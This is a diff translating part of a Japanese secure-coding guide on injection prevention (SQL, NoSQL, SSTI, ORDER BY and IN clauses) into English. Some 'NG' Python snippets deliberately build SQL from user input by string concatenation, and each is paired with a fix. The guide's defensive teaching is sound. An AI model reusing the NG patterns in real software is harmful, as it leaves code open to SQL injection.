-概念的にはほぼ同じだが、厳密には異なる。プリペアドステートメントはDB側でクエリプランをキャッシュする仕組みを含み、パラメータ化クエリはデータとコードを分離する手法を指す。両方とも、インジェクション防御として有効である。ライブラリによってはクライアント側でエスケープする「エミュレートされたプリペアドステートメント」もあるが、真のプリペアドステートメント（サーバーサイド）の方が安全性が高い。
+Conceptually they are almost the same, but strictly speaking they differ. Prepared statements include a mechanism for caching the query plan on the DB side, while parameterized queries refer to the technique of separating data from code. Both are effective as injection defenses. Some libraries offer "emulated prepared statements" that escape on the client side, but true prepared statements (server-side) provide higher security.
 
-### Q4: NoSQL データベースにもインジェクションはありますか?
+### Q4: Can NoSQL databases also be subject to injection?
 
-ある。MongoDBの演算子インジェクション（`$ne`, `$gt` 等）や、`$where`句を使ったJavaScriptインジェクションなどが代表的。NoSQLはスキーマレスであるため、型チェックが特に重要になる。入力が文字列であることを厳密に検証し、オブジェクト型（演算子を含む可能性がある）を拒否することが基本対策となる。
+Yes. Representative examples include MongoDB operator injection (`$ne`, `$gt`, etc.) and JavaScript injection via the `$where` clause. Since NoSQL is schema-less, type checking becomes especially important. Strictly validate that input is a string and reject object types (which may contain operators) as the basic countermeasure.
 
-### Q5: テンプレートインジェクション（SSTI）はどう防ぎますか?
+### Q5: How do I defend against template injection (SSTI)?
 
-最も重要な対策は、ユーザー入力をテンプレート文字列の一部として結合しないこと。テンプレートは固定し、変数として渡す。やむを得ず動的テンプレートが必要な場合は、SandboxedEnvironmentを使用し、危険な属性やメソッドへのアクセスを制限する。
+The most important countermeasure is not to concatenate user input as part of the template string. Fix the template and pass input as a variable. If dynamic templates are unavoidable, use SandboxedEnvironment to restrict access to dangerous attributes and methods.
 
-### Q6: ORDER BY 句や LIMIT 句はパラメータ化できますか?
+### Q6: Can ORDER BY and LIMIT clauses be parameterized?
 
-ほとんどのDBドライバでは、ORDER BY のカラム名やソート方向（ASC/DESC）をパラメータ化できない。これらはSQLの構造の一部であり、データではないため。対策としては、許可するカラム名をホワイトリストで検証し、安全な値であることを確認してから文字列連結する。LIMIT/OFFSET は数値型として検証した上でパラメータ化可能な場合が多い。
+In most DB drivers, column names and sort direction (ASC/DESC) in ORDER BY cannot be parameterized, because they are part of the SQL structure, not data. The countermeasure is to validate allowed column names with a whitelist, confirm they are safe values, and then use string concatenation. LIMIT/OFFSET can often be parameterized after validating them as numeric types.
 
 ---
 
-## トラブルシューティング
+## Troubleshooting
 
-### パラメータ化クエリで IN 句を使いたい
+### Using IN clause with parameterized queries
 
 ```python
-# NG: IN句を文字列連結で構築
+# NG: Build IN clause with string concatenation
 ids = [1, 2, 3]
 query = f"SELECT * FROM users WHERE id IN ({','.join(map(str, ids))})"
 
-# OK: プレースホルダを動的生成
+# OK: Dynamically generate placeholders
 ids = [1, 2, 3]
 placeholders = ','.join(['?'] * len(ids))
 query = f"SELECT * FROM users WHERE id IN ({placeholders})"
@@ -1530,50 +1530,50 @@ from sqlalchemy import select
 stmt = select(User).where(User.id.in_([1, 2, 3]))
 ```
 
-### 動的にカラム名を指定したい
+### Specifying column names dynamically
 
 ```python
-# NG: カラム名を直接埋め込み
+# NG: Embed column name directly
 column = request.args["sort_by"]
 query = f"SELECT * FROM users ORDER BY {column}"
 
-# OK: ホワイトリストで検証
+# OK: Validate with whitelist
 ALLOWED_SORT_COLUMNS = {"username", "email", "created_at"}
 
 column = request.args["sort_by"]
 if column not in ALLOWED_SORT_COLUMNS:
-    column = "created_at"  # デフォルト値
+    column = "created_at"  # Default value
 query = f"SELECT * FROM users ORDER BY {column}"
 ```
 
 ---
 
-## まとめ
+## Summary
 
-| 防御手法 | 対象 | 効果 | 推奨度 |
-|---------|------|------|--------|
-| パラメータ化クエリ | SQL/NoSQL | データとコードの完全分離 | 必須 |
-| ORM | SQL | 安全なクエリ構築の抽象化 | 推奨 |
-| 入力バリデーション | 全般 | 不正入力の早期排除 | 必須 |
-| shell=Falseリスト実行 | コマンド | シェル解釈の回避 | 必須 |
-| エスケープ | LDAP/XPath | 特殊文字の無害化 | 必須 |
-| テンプレート変数分離 | SSTI | コードとデータの分離 | 必須 |
-| WAF | 全般 | 既知パターンのブロック | 補助 |
-| DB最小権限 | SQL | 被害の最小化 | 推奨 |
-| エラーメッセージ制御 | 全般 | 情報漏洩の防止 | 必須 |
-
----
-
-## 次に読むべきガイド
-
-- [04-auth-vulnerabilities.md](./04-auth-vulnerabilities.md) -- 認証脆弱性とセッション管理
-- [01-xss-prevention.md](./01-xss-prevention.md) -- XSS（HTMLインジェクション）の詳細
-- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- セキュアコーディング全般
-- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- 暗号化による通信保護
+| Defense technique | Target | Effect | Recommendation |
+|------------------|--------|--------|----------------|
+| Parameterized queries | SQL/NoSQL | Complete separation of data and code | Required |
+| ORM | SQL | Abstraction of safe query building | Recommended |
+| Input validation | All | Early rejection of invalid input | Required |
+| shell=False list execution | Command | Avoid shell interpretation | Required |
+| Escaping | LDAP/XPath | Neutralize special characters | Required |
+| Template variable separation | SSTI | Separate code and data | Required |
+| WAF | All | Block known patterns | Supplementary |
+| DB least privilege | SQL | Minimize damage | Recommended |
+| Error message control | All | Prevent information leakage | Required |
 
 ---
 
-## 参考文献
+## Next Guides to Read
+
+- [04-auth-vulnerabilities.md](./04-auth-vulnerabilities.md) -- Authentication vulnerabilities and session management
+- [01-xss-prevention.md](./01-xss-prevention.md) -- XSS (HTML injection) in detail
+- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- Secure coding in general
+- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- Communication protection via encryption
+
+---
+
+## References
 
 1. OWASP Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
 2. OWASP SQL Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
